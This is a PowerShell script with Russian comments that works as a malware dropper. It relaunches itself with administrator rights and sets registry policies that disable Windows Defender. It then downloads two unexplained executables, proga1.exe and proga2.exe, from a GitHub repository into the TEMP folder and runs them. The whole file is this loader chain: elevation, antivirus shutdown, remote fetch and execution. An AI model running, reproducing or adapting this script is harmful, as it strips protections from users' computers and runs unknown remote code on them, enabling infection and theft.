Param([switch]$shouldAssumeToBeElevated, [String]$workingDirOverride)

if(-not($PSBoundParameters.ContainsKey('workingDirOverride'))) { 
    $workingDirOverride = (Get-Location).Path 
}

function Test-Admin {
    $currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
    $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
}

if ((Test-Admin) -eq $false) {
    if ($shouldAssumeToBeElevated) {
        Write-Output "Elevating did not work :("
        exit
    } else {
        Start-Process powershell.exe -Verb RunAs -ArgumentList ('-noprofile -file "{0}" -shouldAssumeToBeElevated -workingDirOverride "{1}"' -f ($myinvocation.MyCommand.Definition, "$workingDirOverride"))
    }
    exit
}

Set-Location "$workingDirOverride"

# 1. ОТКЛЮЧЕНИЕ DEFENDER
Write-Host "=== Disabling Windows Defender ===" -ForegroundColor Yellow

$DefenderPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"
$RealTimeProtectionKey = "Real-Time Protection"

if (!(Test-Path $DefenderPath)) { 
    New-Item -Path $DefenderPath -Force 
}
New-Item -Path "$DefenderPath\$RealTimeProtectionKey" -Force -ErrorAction SilentlyContinue

# Установка значений (убедимся что тип правильный)
try {
    Set-ItemProperty -Path $DefenderPath -Name "DisableAntiSpyware" -Value 1 -Type DWord -Force -ErrorAction Stop
    Set-ItemProperty -Path $DefenderPath -Name "DisableAntiVirus" -Value 1 -Type DWord -Force -ErrorAction Stop
    Write-Host "Windows Defender DISABLED (reboot may be required for full effect)" -ForegroundColor Green
} catch {
    Write-Host "Failed to set registry values: $_" -ForegroundColor Red
}

# 2. СКАЧИВАНИЕ И ЗАПУСК ФАЙЛОВ
Write-Host ""
Write-Host "=== Downloading and Running Files ===" -ForegroundColor Yellow

$temp = $env:TEMP
$downloaded = 0

# Функция скачивания
function Download-File {
    param($url, $dest)
    
    # Удаляем старый файл если существует
    if (Test-Path $dest) { 
        Remove-Item $dest -Force -ErrorAction SilentlyContinue 
    }
    
    try {
        Write-Host "Downloading from: $url" -ForegroundColor Gray
        # Пробуем BITS сначала
        Start-BitsTransfer -Source $url -Destination $dest -Priority High -ErrorAction Stop
        return $true
    } catch {
        Write-Host "BITS failed: $($_.Exception.Message)" -ForegroundColor DarkYellow
        try {
            # Пробуем Invoke-WebRequest
            Invoke-WebRequest -Uri $url -OutFile $dest -UseBasicParsing -ErrorAction Stop
            return $true
        } catch {
            Write-Host "WebRequest failed: $($_.Exception.Message)" -ForegroundColor DarkYellow
            return $false
        }
    }
}

# Проверка доступности интернета
try {
    $null = Invoke-WebRequest -Uri "https://github.com" -TimeoutSec 5 -UseBasicParsing
    Write-Host "Internet connection: OK" -ForegroundColor Green
} catch {
    Write-Host "WARNING: No internet connection or GitHub unreachable" -ForegroundColor Red
}

# Первый файл
$url1 = "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/proga1.exe"
$dest1 = "$temp\proga1.exe"

Write-Host "`n[1/2] Downloading proga1.exe..." -ForegroundColor Cyan
if (Download-File $url1 $dest1) {
    if ((Get-Item $dest1).Length -gt 0) {
        Write-Host "SUCCESS: proga1.exe downloaded ($((Get-Item $dest1).Length / 1KB) KB)" -ForegroundColor Green
        $downloaded++
    } else {
        Write-Host "FAILED: proga1.exe is empty/corrupt" -ForegroundColor Red
    }
} else {
    Write-Host "FAILED: proga1.exe" -ForegroundColor Red
}

# Второй файл
$url2 = "https://github.com/slavicNoCheater2/network/raw/refs/heads/main/proga2.exe"
$dest2 = "$temp\proga2.exe"

Write-Host "`n[2/2] Downloading proga2.exe..." -ForegroundColor Cyan
if (Download-File $url2 $dest2) {
    if ((Get-Item $dest2).Length -gt 0) {
        Write-Host "SUCCESS: proga2.exe downloaded ($((Get-Item $dest2).Length / 1KB) KB)" -ForegroundColor Green
        $downloaded++
    } else {
        Write-Host "FAILED: proga2.exe is empty/corrupt" -ForegroundColor Red
    }
} else {
    Write-Host "WARNING: proga2.exe not found on server" -ForegroundColor Yellow
    if (Test-Path $dest1) {
        Copy-Item $dest1 $dest2 -Force
        Write-Host "Created proga2.exe as copy of proga1.exe" -ForegroundColor Green
        $downloaded++
    } else {
        Write-Host "ERROR: Cannot create proga2.exe (proga1.exe missing)" -ForegroundColor Red
    }
}

# 3. ЗАПУСК ФАЙЛОВ
Write-Host ""
Write-Host "=== Running Files ===" -ForegroundColor Yellow

if (Test-Path $dest1) {
    Write-Host "Starting proga1.exe..." -ForegroundColor Green
    Start-Process -FilePath $dest1 -WindowStyle Normal
} else {
    Write-Host "proga1.exe not found!" -ForegroundColor Red
}

if (Test-Path $dest2) {
    # Небольшая задержка перед запуском второго
    Start-Sleep -Seconds 1
    Write-Host "Starting proga2.exe..." -ForegroundColor Green
    Start-Process -FilePath $dest2 -WindowStyle Normal
} else {
    Write-Host "proga2.exe not found!" -ForegroundColor Red
}

Write-Host ""
Write-Host "=== ALL DONE ($downloaded/2 files processed) ===" -ForegroundColor Green
Write-Host ""
Write-Host "Press any key to exit..." -ForegroundColor Gray
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
